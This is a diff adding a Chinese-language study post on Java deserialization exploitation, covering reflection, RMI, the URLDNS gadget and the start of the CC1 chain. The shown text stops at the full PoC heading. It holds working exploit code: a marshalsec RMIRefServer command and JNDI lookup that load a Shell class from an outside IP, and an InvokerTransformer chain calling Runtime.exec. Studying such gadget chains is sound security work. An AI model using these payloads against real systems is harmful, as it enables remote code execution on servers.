@@ -50,7 +50,7 @@
 
 <meta itemprop="datePublished" content="2021-02-02T17:52:36&#43;08:00" />
 <meta itemprop="dateModified" content="2021-02-02T17:52:36&#43;08:00" />
-<meta itemprop="wordCount" content="125">
+<meta itemprop="wordCount" content="4980">
 
 
 
@@ -131,8 +131,8 @@
         <div class="post-category">
             <a href="/categories/code_audit/"> code_audit </a>
             </div>
-          <span class="more-meta"> 约 125 字 </span>
-          <span class="more-meta"> 预计阅读 1 分钟 </span>
+          <span class="more-meta"> 约 4980 字 </span>
+          <span class="more-meta"> 预计阅读 10 分钟 </span>
         <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
       </div>
     </header>
@@ -145,6 +145,20 @@
 <li>
 <ul>
 <li><a href="#java反射">Java反射</a></li>
+<li><a href="#rmi">RMI</a>
+<ul>
+<li><a href="#如何利用rmi进行攻击">如何利用RMI进行攻击</a></li>
+</ul></li>
+<li><a href="#java反序列化gadget分析">Java反序列化Gadget分析</a>
+<ul>
+<li><a href="#urldns">URLDNS</a>
+<ul>
+<li><a href="#一些说明如下">一些说明如下</a></li>
+<li><a href="#调用栈">调用栈</a></li>
+<li><a href="#调用栈分析">调用栈分析</a></li>
+</ul></li>
+<li><a href="#cc1-jdk-version-jdk8u66">CC1(JDK Version&lt;=JDK8u66)</a></li>
+</ul></li>
 </ul></li>
 </ul>
 </nav>
@@ -161,9 +175,1023 @@
 
 <ul>
 <li>obj.getClass()</li>
-<li>Class.forname(&ldquo;类的全路径&rdquo;)</li>
+<li>Class.forName(&ldquo;类的全路径&rdquo;)</li>
 <li>Test.class</li>
 </ul>
+
+<p>对于第二种方式，其方式相当于：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Class.forName(className);
+// 相当于：
+// 第二个参数为true意味着执行静态初始化块
+Class.forName(className,true,currentLoader);</pre></td></tr></table>
+</div>
+</div>
+<p>此外，对于Java类种，初始化块的执行顺序为：<strong>先执行静态初始化块，再执行非静态初始化块，然后才是构造器</strong> 。</p>
+
+<p>java.lang.Class对象的常用方法如下：</p>
+
+<ul>
+<li>clazz.newInstance()：调用这个类的无参构造器。不过不是每个类都有无参构造器；</li>
+<li>clazz.getMethod()：获取这个类的某个公有方法，因为函数存在重载，所以需要传入形参才能唯一确定获取的方法；</li>
+<li>method.invoke()：执行方法；对于这个函数的第一个参数，如果method是非静态方法，则第一个参数为类对象；如果method是静态方法，则第一个参数是类；</li>
+</ul>
+
+<p>一个利用反射执行命令的demo入下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test1() throws Exception {
+    Class&lt;?&gt; clazz = Class.forName(&#34;java.lang.Runtime&#34;);
+    clazz.getMethod(&#34;exec&#34;, String.class).invoke(clazz.getMethod(&#34;getRuntime&#34;).invoke(clazz),&#34;mspaint&#34;);
+}</pre></td></tr></table>
+</div>
+</div>
+<p>如果一个类没有无参构造器，且没有静态方法，如何通过反射实例化该类对象，一个例子如下所示：</p>
+
+<p>其中需要注意： <strong>调用newInstance的时候，因为这个函数本身接收的就是一个可变长参数，而我们传给ProcessBuilder构造器的也是一个可变长参数，二者叠加就是一个二维数组。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test2() throws Exception{
+    Class&lt;?&gt; clazz = Class.forName(&#34;java.lang.ProcessBuilder&#34;);
+    clazz.getMethod(&#34;start&#34;).invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{&#34;calc&#34;}}));
+}</pre></td></tr></table>
+</div>
+</div>
+<p>如果一个方法是私有的，如何执行，一个例子如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test3() throws Exception{
+    Class&lt;?&gt; clazz = Class.forName(&#34;java.lang.Runtime&#34;);
+    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();
+    constructor.setAccessible(true);
+    clazz.getMethod(&#34;exec&#34;, String.class).invoke(constructor.newInstance(),&#34;mspaint&#34;);
+}</pre></td></tr></table>
+</div>
+</div>
+<h2 id="rmi">RMI</h2>
+
+<p>RMI全称是 <code>Remote Mehtod Invocaton</code> ，即远程方法调用，目的就是为了让某个java虚拟机上的对象调用另一个java虚拟机中对象上的方法，是Java独有的一种机制。</p>
+
+<p>RMI主要存在三个组件：</p>
+
+<ul>
+<li>RMI Register</li>
+<li>RMI Server</li>
+<li>RMI Client</li>
+</ul>
+
+<p>首先编写一个RMI Server：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">/**
+ * @author : p1n93r
+ * @date : 2021/3/30 15:37
+ * rmi服务端
+ */
+public class RmiServer {
+
+    /**
+     * 继承了Remote类才能进行远程方法调用
+     */
+    public interface IRemoteHelloWorld extends Remote {
+        public String hello() throws RemoteException;
+    }
+
+    /**
+     * 远程对象，需要继承UnicastRemoteObject类
+     */
+    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld{
+        protected RemoteHelloWorld() throws RemoteException {}
+        @Override
+        public String hello() throws RemoteException {
+            System.out.println(&#34;我是远程RMI服务端....我正在执行hello()方法...&#34;);
+            return &#34;Hello,I&#39;m p1n93r.&#34;;
+        }
+    }
+
+    /**
+     * 开启RMI监听
+     */
+    public void startRmiBinding() throws Exception{
+        RemoteHelloWorld obj = new RemoteHelloWorld();
+        LocateRegistry.createRegistry(1099);
+        Naming.bind(&#34;rmi://127.0.0.1/Hello&#34;,obj);
+    }
+
+    public static void main(String[] args) throws Exception {
+        new RmiServer().startRmiBinding();
+    }
+}</pre></td></tr></table>
+</div>
+</div>
+<p>然后编写一个RMI Client调用远程方法测试一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">/**
+ * @author : p1n93r
+ * @date : 2021/3/30 15:46
+ * RMI客户端
+ */
+public class RmiClient {
+
+    public static void main(String[] args)  throws Exception {
+        String[] list = Naming.list(&#34;rmi://127.0.0.1&#34;);
+        System.out.println(&#34;RMI服务端所有的对象如下：&#34;);
+        for (String s : list) {
+            System.out.println(s);
+        }
+
+        //测试调用远程方法
+        System.out.println(&#34;=================================分隔符=====================================&#34;);
+        // 调用RemoteHelloWorld和hello()
+        Remote obj = Naming.lookup(&#34;rmi://127.0.0.1/Hello&#34;);
+        Class&lt;? extends Remote&gt; clazz = obj.getClass();
+        Object hello = clazz.getMethod(&#34;hello&#34;).invoke(obj);
+        System.out.println(hello);
+    }
+}</pre></td></tr></table>
+</div>
+</div>
+<p>注意： <strong>hello()方法实际上实在RmiServer上执行的，RmiClient只是获取到了方法返回结果</strong> 。</p>
+
+<p>运行截图如下所示：</p>
+
+<p><img src="./../media/2020-03-30-1.png" alt="rmiserver" /></p>
+
+<p><img src="./../media/2020-03-30-2.png" alt="rmiclient" /></p>
+
+<p>RMI的主要组件示意图如下所示：</p>
+
+<p><img src="./../media/2020-03-30-3.png" alt="RMI组件示意图" /></p>
+
+<h3 id="如何利用rmi进行攻击">如何利用RMI进行攻击</h3>
+
+<p>首先，如果我们可以访问RMI Register，那么我们可以遍历RMI Server上绑定的所有对象，然后探测这些对象的所有方法，如下demo所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test1() throws Exception{
+    String[] list = Naming.list(&#34;rmi://127.0.0.1&#34;);
+    ArrayList&lt;Object&gt; rmiObjs = new ArrayList&lt;&gt;();
+    for (String s : list) {
+        System.out.println(s);
+        Remote current = Naming.lookup(&#34;rmi:&#34; + s);
+        rmiObjs.add(current);
+    }
+    rmiObjs.forEach(v-&gt;{
+        // TODO:探测远程对象的方法，进行恶意操作
+    });
+}</pre></td></tr></table>
+</div>
+</div>
+<p>其次，如果我们可以控制lookup的地址和codebase(java低版本可以随意控制)，那么我们就可以利用RMI执行任意代码了，一个例子如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test2() throws Exception{
+    System.setProperty(&#34;java.rmi.server.useCodebaseOnly&#34;, &#34;false&#34;);
+    System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);
+    System.setProperty(&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;, &#34;true&#34;);
+    Context context = new InitialContext();
+    Object object = context.lookup(&#34;rmi://49.234.105.98/Hello&#34;);
+    System.out.println(object);
+}</pre></td></tr></table>
+</div>
+</div>
+<p>RMI服务端则利用marshalsec攻击创建，如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">java -cp marshalsec.jar marshalsec.jndi.RMIRefServer &#34;http://49.234.105.98:8080/#Shell&#34; 1099</pre></td></tr></table>
+</div>
+</div>
+<p>Notice: 需要再开一个Http服务传递Shell.class文件</p>
+
+<p><img src="./../media/2020-03-31-1.png" alt="marshalsec服务端" /></p>
+
+<h2 id="java反序列化gadget分析">Java反序列化Gadget分析</h2>
+
+<h3 id="urldns">URLDNS</h3>
+
+<p>先给出ysoserial中的利用链：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">/**
+ * @author : p1n93r
+ * @date : 2021/3/31 11:28
+ * URLDNS Gadget分析
+ */
+public class URLDNS {
+
+    public static Object getObject(final String url) throws Exception {
+
+        //Avoid DNS resolution during payload creation
+        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+        URLStreamHandler handler = new SilentURLStreamHandler();
+
+        // HashMap that will contain the URL
+        HashMap ht = new HashMap();
+        // URL to use as the Key
+        URL u = new URL(null, url, handler);
+        //URL u = new URL(null, url);
+        //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+        ht.put(u, url);
+
+        // During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+        Class&lt;? extends URL&gt; clazz = u.getClass();
+        Field hashCode = clazz.getDeclaredField(&#34;hashCode&#34;);
+        hashCode.setAccessible(true);
+        hashCode.setInt(u,-1);
+
+        return ht;
+    }
+
+    /**
+     * 防止创建payload的时候发送DNS解析请求
+     */
+    static class SilentURLStreamHandler extends URLStreamHandler {
+
+        @Override
+        protected URLConnection openConnection(URL u) throws IOException {
+            return null;
+        }
+
+
+        @Override
+        protected synchronized InetAddress getHostAddress(URL u) {
+            return null;
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        Object object = getObject(&#34;http://aa32z3.dnslog.cn&#34;);
+        SerialUtil.runPayload(object);
+    }
+}</pre></td></tr></table>
+</div>
+</div>
+<p><code>SerialUtil.runPayload(object)</code> 的代码如下，就是将构造的恶意对象进行序列化和反序列化操作：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">public static void runPayload(Object object) throws Exception{
+    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
+    objectOutputStream.writeObject(object);
+    objectOutputStream.close();
+    System.out.println(outputStream);
+    new ObjectInputStream(new ByteArrayInputStream(outputStream.toByteArray())).readObject();
+}</pre></td></tr></table>
+</div>
+</div>
+<h4 id="一些说明如下">一些说明如下</h4>
+
+<ul>
+<li>利用链中，实例化URL对象时，传入一个自定义的 <code>SilentURLStreamHandler</code> 类对象，目的为了防止未反序列化前，执行了 <code>getHostAddress()</code> 方法。自定义的 <code>SilentURLStreamHandler</code> 重写了 <code>getHostAddress()</code> 方法，始终返回null，也没进行DNS解析请求，所以反序列化之前，不会进行DNS解析。</li>
+<li>测试URLDNS攻击链，需要传入的url必须是域名格式的，否则不解析。因为是域名解析嘛，所以肯定得域名，ip是不支持的。</li>
+<li>URL类中的handler属性，是transient标识的，不进行序列化。反序列化时，从context中获取handler，所以即使URL对象中的handler属性是我们自定义的一个 <code>SilentURLStreamHandler</code> 类对象，反序列化时仍能执行 <code>getHostAddress()</code> 方法。</li>
+</ul>
+
+<h4 id="调用栈">调用栈</h4>
+
+<p>调用栈如下所示：</p>
+
+<p><img src="./../media/2020-03-31-2.png" alt="URLDNS调用栈" /></p>
+
+<h4 id="调用栈分析">调用栈分析</h4>
+
+<p>java.util.HashMap#readObject入下所示，末尾 <code>putVal(hash(key), key, value, false, false);</code> 调用了 <code>hash(key)</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">private void readObject(java.io.ObjectInputStream s)
+    throws IOException, ClassNotFoundException {
+    // Read in the threshold (ignored), loadfactor, and any hidden stuff
+    s.defaultReadObject();
+    reinitialize();
+    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))
+        throw new InvalidObjectException(&#34;Illegal load factor: &#34; +
+                                         loadFactor);
+    s.readInt();                // Read and ignore number of buckets
+    int mappings = s.readInt(); // Read number of mappings (size)
+    if (mappings &lt; 0)
+        throw new InvalidObjectException(&#34;Illegal mappings count: &#34; +
+                                         mappings);
+    else if (mappings &gt; 0) { // (if zero, use defaults)
+        // Size the table using given load factor only if within
+        // range of 0.25...4.0
+        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
+        float fc = (float)mappings / lf + 1.0f;
+        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?
+                   DEFAULT_INITIAL_CAPACITY :
+                   (fc &gt;= MAXIMUM_CAPACITY) ?
+                   MAXIMUM_CAPACITY :
+                   tableSizeFor((int)fc));
+        float ft = (float)cap * lf;
+        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?
+                     (int)ft : Integer.MAX_VALUE);
+
+        // Check Map.Entry[].class since it&#39;s the nearest public type to
+        // what we&#39;re actually creating.
+        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
+        @SuppressWarnings({&#34;rawtypes&#34;,&#34;unchecked&#34;})
+        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];
+        table = tab;
+
+        // Read the keys and values, and put the mappings in the HashMap
+        for (int i = 0; i &lt; mappings; i++) {
+            @SuppressWarnings(&#34;unchecked&#34;)
+                K key = (K) s.readObject();
+            @SuppressWarnings(&#34;unchecked&#34;)
+                V value = (V) s.readObject();
+            putVal(hash(key), key, value, false, false);
+        }
+    }
+}</pre></td></tr></table>
+</div>
+</div>
+<p>跟进java.util.HashMap#hash，如下所示，调用了 <code>key.hashCode()</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">static final int hash(Object key) {
+    int h;
+    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+}</pre></td></tr></table>
+</div>
+</div>
+<p>而此时的key为java.net.URL类对象，那么继续跟进java.net.URL#hashCode，如下所示，首先判断当前对象的hashCode是否等于-1，如果等于的话，则调用 <code>hander.hashCode(this)</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">public synchronized int hashCode() {
+    if (hashCode != -1)
+        return hashCode;
+
+    hashCode = handler.hashCode(this);
+    return hashCode;
+}</pre></td></tr></table>
+</div>
+</div>
+<p>继续跟进java.net.URLStreamHandler#hashCode，如下所示，可以看到调用了 <code>getHostAddress(u)</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">protected int hashCode(URL u) {
+    int h = 0;
+
+    // Generate the protocol part.
+    String protocol = u.getProtocol();
+    if (protocol != null)
+        h += protocol.hashCode();
+
+    // Generate the host part.
+    InetAddress addr = getHostAddress(u);
+    if (addr != null) {
+        h += addr.hashCode();
+    } else {
+        String host = u.getHost();
+        if (host != null)
+            h += host.toLowerCase().hashCode();
+    }
+
+    // Generate the file part.
+    String file = u.getFile();
+    if (file != null)
+        h += file.hashCode();
+
+    // Generate the port part.
+    if (u.getPort() == -1)
+        h += getDefaultPort();
+    else
+        h += u.getPort();
+
+    // Generate the ref part.
+    String ref = u.getRef();
+    if (ref != null)
+        h += ref.hashCode();
+
+    return h;
+}</pre></td></tr></table>
+</div>
+</div>
+<p>继续跟进java.net.URLStreamHandler#getHostAddress，如下所示，调用了 <code>InetAddress.getByName(host)</code> ，至此整个利用链完毕：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">protected synchronized InetAddress getHostAddress(URL u) {
+    if (u.hostAddress != null)
+        return u.hostAddress;
+
+    String host = u.getHost();
+    if (host == null || host.equals(&#34;&#34;)) {
+        return null;
+    } else {
+        try {
+            u.hostAddress = InetAddress.getByName(host);
+        } catch (UnknownHostException ex) {
+            return null;
+        } catch (SecurityException se) {
+            return null;
+        }
+    }
+    return u.hostAddress;
+}</pre></td></tr></table>
+</div>
+</div>
+<h3 id="cc1-jdk-version-jdk8u66">CC1(JDK Version&lt;=JDK8u66)</h3>
+
+<p>为了便于理解，先抽出ysoserial中的片段进行分析，首先抽出主要逻辑，如下，LazyMap进行get操作的时候，会触发Transformer操作，即可执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test5(){
+    // 测试一下ChainedTransformer利用
+    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, new Class[0]}),
+            new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc&#34;})
+    });
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+    // 测试一下lazyMap
+    Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
+    lazyMap.get(&#34;test&#34;);
+}</pre></td></tr></table>
+</div>
+</div>
+<p>但是如何触发LazyMap的get操作呢？ysoserial中是利用代理触发LazyMap#get，即通过代理对象的handler#invoke来调用LazyMap#get。下面是创建代理对象的关键代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">// 将LazyMap封装在AnnotationInvocationHandler中，想办法触发AnnotationInvocationHandler#invoke方法，因为invoke方法内调用了lazyMap#get
+Class&lt;?&gt; clazz = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
+Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
+
+// 如何调用AnnotationInvocationHandler#invoke方法呢？可以使用代理，将前面获取的AnnotationInvocationHandler对象作为代理的handler
+// 那么只要调用代理对象的任何方法，都将触发AnnotationInvocationHandler对象的invoke方法
+// 获取一个代理对象，将前面获取的AnnotationInvocationHandler实例作为代理对象的InvocationHandler
+Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);</pre></td></tr></table>
+</div>
+</div>
+<p>获取了代理对象后，就可以将代理对象封装在AnnocationInvocationHanler对象中，作为整个反序列化的入口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">// 最后将proxyMap封装在AnnotationInvocationHandler对象中，作为反序列化入口
+InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
+
+// 最后再把真正的Transformer传入chainedTransformer
+Class&lt;? extends ChainedTransformer&gt; chainedTransformerClass = chainedTransformer.getClass();
+Field iTransformers = chainedTransformerClass.getDeclaredField(&#34;iTransformers&#34;);
+iTransformers.setAccessible(true);
+iTransformers.set(chainedTransformer,trueTransformer);</pre></td></tr></table>
+</div>
+</div>
+<p>完整的POC如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
